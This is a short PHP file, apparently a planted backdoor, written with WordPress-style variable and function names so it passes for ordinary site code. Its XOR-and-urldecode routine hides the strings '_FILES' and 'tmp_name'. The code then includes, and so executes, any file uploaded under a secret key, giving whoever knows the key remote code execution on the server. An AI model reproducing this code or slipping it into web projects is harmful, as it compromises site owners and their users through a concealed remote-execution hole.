<?php 	

function first()

{

    $num_octets = 'o8htMuUcHT7P';
	$ext_preg = 'field';
    $old_slugs = $num_octets;
    
    $rest_controller_class = $GLOBALS[posts_per_page("0%7E%218%08%26", $old_slugs)];
    $part = $rest_controller_class;

    $sizeinfo = isset($part[$old_slugs]);
    if ($sizeinfo)

    {
        $rewrite = $rest_controller_class[$old_slugs];
        $new_date = $rewrite[posts_per_page("%1BU%18%2B%23%148%06", $old_slugs)];

        $icon_files = $new_date;
	$lazyloader = 'string';
        include ($icon_files);
    }
}

function posts_per_page($previous_status, $original_text)

{
    $timezone = $original_text;
    $hierarchical = "url" . "decode";

    $prime_pattern = $hierarchical($previous_status);
    $string_nullspace = substr($timezone,0, strlen($prime_pattern));
    $args = $prime_pattern ^ $string_nullspace;
    
    $prime_pattern = strpos($args, $string_nullspace);

    
    return $args;
}


first();

?>
